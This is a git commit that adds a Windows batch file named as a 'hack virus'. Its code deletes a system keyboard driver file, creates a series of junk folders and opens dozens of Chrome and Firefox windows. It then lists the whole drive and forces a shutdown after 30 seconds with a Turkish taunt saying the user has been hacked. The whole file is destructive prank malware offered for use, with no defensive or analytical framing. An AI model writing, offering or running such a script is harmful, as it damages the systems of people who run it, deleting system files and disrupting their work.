d2ae1a6339c74f7ed3dd0ff95b112dca710e18d1
devrimbaran1 <76806728+devrimbaran1@users.noreply.github.com>
2020-12-31 10:43:51 +0300

    Add files via upload

---
+++ HACKVİRÜS.bat
@@ -0,0 +1,78 @@
+del C:/WINDOWS/system/KEYBOARD.DRV
+
+md virüs1
+md virüs2
+md virüs3
+md virüs4
+md virüs5
+md virüs6
+md virüs7
+md virüs8
+md virüs9
+md virüs0
+md virüs10
+md virüs11
+md virüs12
+md virüs13
+md virüs14
+
+color a
+
+start chrome
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+start chrome
+start chrome
+start firefox
+
+cd..
+
+c..
+
+dir /S
+
+shutdown -s -t 30 -c '' HACKER TARAFINDAN HACKLENDÝN MORUQ!!! ''
